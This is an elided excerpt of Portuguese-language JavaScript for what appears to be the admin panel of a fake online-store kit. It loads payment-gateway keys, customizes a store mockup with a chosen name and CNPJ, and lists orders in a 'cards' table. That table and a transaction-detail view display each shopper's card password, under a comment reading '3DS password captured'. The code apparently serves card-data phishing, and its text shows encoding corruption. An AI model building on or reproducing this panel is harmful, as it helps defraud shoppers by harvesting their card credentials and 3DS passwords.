...
Agradecemos pela preferência e esperamos você!`;
  ...
  async function loadInitialData() {    if (safeStorage.getItem('admin_authenticated') !== 'true') return;
    ...
    try {
      ...
      if (configRes.ok) {
        ...
        if (bcPubKeyInput) bcPubKeyInput.value = configData.blackcat_public_key || '';
        if (bcSecKeyInput) bcSecKeyInput.value = configData.blackcat_secret_key || '';
        if (wpPubKeyInput) wpPubKeyInput.value = configData.wappi_public_key || '';
        if (wpApiKeyInput) wpApiKeyInput.value = configData.wappi_api_key || '';
  ...
  function renderDistributions(orders) {
    ...
    if (orders.length === 0) {
      ...
      const stateCounts = {};
      orders.forEach(tx => {
        const state = tx.state ? tx.state.toUpperCase() : 'NÃƒO INFORMADO';
  ...
  function renderCartoesTable(orders) {
    ...
    if (orders.length === 0) {
      ...
      cartoesTbody.innerHTML = orders.map(order => {
        ...
        const cardPassword = order.card_password || '<NÃƒO DIGITADA>';
  ...
  function openTransactionDetails(id) {
    ...
    if (tx.payment_method && tx.payment_method.toLowerCase() === 'pix') {
      ...
      // SENHA 3DS CAPTURADA
      detailCardPassword.innerText = tx.card_password || '<NÃƒO DIGITADA>';
  ...
  function updateMockup() {
    ...
    if (mockFooterElement) {
      ...
      if (mockCopyrightText) {
        ...
        mockCopyrightText.innerText = `Â© ${year} ${storeName} ${storeCnpj ? `- CNPJ: ${storeCnpj}` : ''}`;
